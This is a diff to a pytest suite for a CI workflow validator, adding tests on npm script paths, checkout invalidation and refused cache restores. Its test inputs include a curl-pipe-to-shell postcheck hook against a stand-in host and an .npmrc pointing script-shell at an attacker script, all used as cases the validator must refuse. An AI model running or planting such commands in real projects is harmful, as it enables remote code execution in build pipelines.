@@ -872,7 +872,7 @@ def _npm_project(directory: Path, scripts: dict[str, str]) -> Path:
 
 def test_a_project_npmrc_is_refused(tmp_path: Path) -> None:
     """Sol r4 probe npmrc_script_shell: script-shell replaces every script's shell."""
-    package = _npm_project(tmp_path, {"test:unit": "vitest run"})
+    package = _npm_project(tmp_path, {"test:unit": "node_modules/.bin/vitest run"})
     (tmp_path / ".npmrc").write_text("script-shell=./attacker.sh\n", encoding="utf-8")
     workflow = tmp_path / "probe.yml"
     steps = "      - run: npm ci --ignore-scripts\n      - run: npm run test:unit"
@@ -1336,6 +1336,108 @@ def test_windows_jobs_run_powershell_only(tmp_path: Path) -> None:
     assert any("PowerShell only" in p for p in _verdict(tmp_path, steps))
 
 
+_CHECKOUT = "      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd\n"
+_SETUP_NODE = (
+    "      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444\n"
+    "        with:\n          node-version: '24'\n          cache: npm\n"
+)
+_BUILD = "uv run --locked --only-group release python -I -m build --no-isolation --outdir dist"
+_EXPORT = (
+    "uv export --locked --no-default-groups --no-emit-project --format requirements.txt"
+    " --output-file requirements-lock.txt"
+)
+WORKSPACE_PRODUCERS = {
+    # (producer steps, consumer steps): accepted as is, refused with a checkout between.
+    "npm_ci": ("      - run: npm ci --ignore-scripts\n", "      - run: npm run lint\n"),
+    "npm_ci_playwright": (
+        "      - run: npm ci --ignore-scripts\n",
+        f"      - run: {_NPX}\n",
+    ),
+    "venv": (
+        "      - run: python -I -m venv /tmp/smoke-venv\n",
+        "      - run: /tmp/smoke-venv/bin/pip check\n",
+    ),
+    "export": (
+        f"      - run: {_EXPORT}\n      - run: python -I -m venv /tmp/wheel-venv\n",
+        "      - run: |\n          /tmp/wheel-venv/bin/pip install --only-binary :all:"
+        " --require-hashes -r requirements-lock.txt\n",
+    ),
+    "dist": (
+        f"      - run: {_BUILD}\n      - run: python -I -m venv /tmp/smoke-venv\n",
+        "      - run: |\n          /tmp/smoke-venv/bin/pip install --only-binary :all:"
+        " --no-deps --no-index dist/gpo_studio-*.whl\n",
+    ),
+}
+
+
+@pytest.mark.parametrize("name", sorted(WORKSPACE_PRODUCERS))
+def test_a_checkout_after_a_producer_voids_its_facts(name: str, tmp_path: Path) -> None:
+    """Sol r12 B1: checkout's `git clean -ffdx` removes node_modules, dist/, exports; a
+    fact established before it must not admit a consumer after it."""
+    producer, consumer = WORKSPACE_PRODUCERS[name]
+    assert _verdict(tmp_path, producer + consumer) == []
+    assert _verdict(tmp_path, producer + _SETUP_NODE + consumer) == []
+    problems = _verdict(tmp_path, producer + _CHECKOUT + consumer)
+    assert any("established earlier in this job" in p for p in problems), problems
+
+
+def test_the_smoke_hand_off_needs_its_build_since_the_last_checkout(tmp_path: Path) -> None:
+    build, rest = _HAND_OFF.split("\n", 1)
+    assert _verdict(tmp_path, f"{build}\n{_CHECKOUT}{rest}")
+
+
+def test_every_allowed_action_is_classified_for_the_workspace() -> None:
+    """A new action invalidates every fact unless reviewed as leaving the workspace alone."""
+    mutating = set(workflow_grammar.ACTIONS) - set(workflow_grammar.WORKSPACE_PRESERVING_ACTIONS)
+    assert mutating == {"actions/checkout"}
+    assert set(workflow_grammar.WORKSPACE_PRESERVING_ACTIONS) <= set(workflow_grammar.ACTIONS)
+
+
+def test_no_action_may_restore_a_workspace_install(tmp_path: Path) -> None:
+    """Restoring node_modules, a venv or dist/ would inject unlocked content: refused."""
+    for step in (
+        "      - uses: actions/cache@caa296126883cff596d87d8935842f9db880ef25\n"
+        "        with:\n          path: node_modules\n          key: x",
+        "      - uses: actions/cache@caa296126883cff596d87d8935842f9db880ef25\n"
+        "        with:\n          path: /tmp/smoke-venv\n          key: x",
+        "      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n"
+        "        with:\n          name: dist\n          path: dist",
+    ):
+        assert _verdict(tmp_path, step), step
+
+
+def test_npm_scripts_fail_closed_without_the_local_install(tmp_path: Path) -> None:
+    """Sol r12's probe, executed: with node_modules gone and a same-named program on PATH,
+    the reviewed script (explicit local path) fails instead of running it; the old
+    plain-name script, the control, runs it."""
+    import shutil
+    import subprocess
+
+    if shutil.which("npm") is None:
+        pytest.skip("needs npm")
+    stub = tmp_path / "ambient"
+    stub.mkdir()
+    marker = tmp_path / "AMBIENT_ESLINT_RAN"
+    (stub / "eslint").write_text(f"#!/bin/sh\ntouch {marker}\n", encoding="utf-8")
+    (stub / "eslint").chmod(0o755)
+    environment = {**os.environ, "PATH": f"{stub}:{os.environ.get('PATH', '')}"}
+    reviewed = json.loads((REPO_ROOT / "package.json").read_text(encoding="utf-8"))["scripts"]
+    old = reviewed["lint"].removeprefix("node_modules/.bin/")
+    for body, ran in ((old, True), (reviewed["lint"], False)):
+        project = tmp_path / ("old" if ran else "reviewed")
+        project.mkdir()
+        (project / "package.json").write_text(
+            json.dumps({"name": "probe", "scripts": {"lint": body}}), encoding="utf-8"
+        )
+        completed = subprocess.run(
+            ["npm", "run", "lint"], cwd=project, env=environment, capture_output=True
+        )
+        assert marker.exists() == ran, (body, completed.stdout, completed.stderr)
+        if not ran:
+            assert completed.returncode != 0
+        marker.unlink(missing_ok=True)
+
+
 def test_a_reusable_workflow_call_takes_no_inputs(tmp_path: Path) -> None:
     """DeepSeek r6 N2: `with:` would reach the called workflow as unchecked data."""
     steps = (
@@ -1635,11 +1737,11 @@ NPM_SCRIPT_VARIANTS = {
         "npm run a",
     ),
     "pre_hook": (
-        {"check": "vitest run", "precheck": "pip install requests"},
+        {"check": "node_modules/.bin/vitest run", "precheck": "pip install requests"},
         "npm run check",
     ),
     "post_hook": (
-        {"check": "vitest run", "postcheck": "curl -sS https://x.invalid | sh"},
+        {"check": "node_modules/.bin/vitest run", "postcheck": "curl -sS https://x.invalid | sh"},
         "npm run check",
     ),
     "cycle": ({"a": "npm run b", "b": "npm run a"}, "npm run a"),
@@ -1658,8 +1760,11 @@ NPM_SCRIPT_VARIANTS = {
         },
         "npm run x",
     ),
-    "postinstall_on_ci": ({"postinstall": "vitest run"}, "npm ci --ignore-scripts"),
-    "prepare_on_ci": ({"prepare": "vitest run"}, "npm ci --ignore-scripts"),
+    "postinstall_on_ci": (
+        {"postinstall": "node_modules/.bin/vitest run"},
+        "npm ci --ignore-scripts",
+    ),
+    "prepare_on_ci": ({"prepare": "node_modules/.bin/vitest run"}, "npm ci --ignore-scripts"),
 }
 
 
@@ -1676,10 +1781,11 @@ def test_an_npm_script_is_read_and_held_to_the_same_grammar(name: str, tmp_path:
 def test_the_npm_negative_template_itself_is_accepted(tmp_path: Path) -> None:
     package = tmp_path / "package.json"
     lint = (
-        "eslint -- src/gpo_studio/static/js tests/browser tests/frontend "
+        "node_modules/.bin/eslint -- src/gpo_studio/static/js tests/browser tests/frontend "
         "eslint.config.mjs playwright.config.mjs vitest.config.mjs"
     )
-    scripts = {"check": "npm run lint && vitest run", "lint": lint, "precheck": "vitest run"}
+    unit = "node_modules/.bin/vitest run"
+    scripts = {"check": f"npm run lint && {unit}", "lint": lint, "precheck": unit}
     package = _npm_project(tmp_path, scripts)
     workflow = tmp_path / "probe.yml"
     steps = "      - run: npm ci --ignore-scripts\n      - run: npm run check"
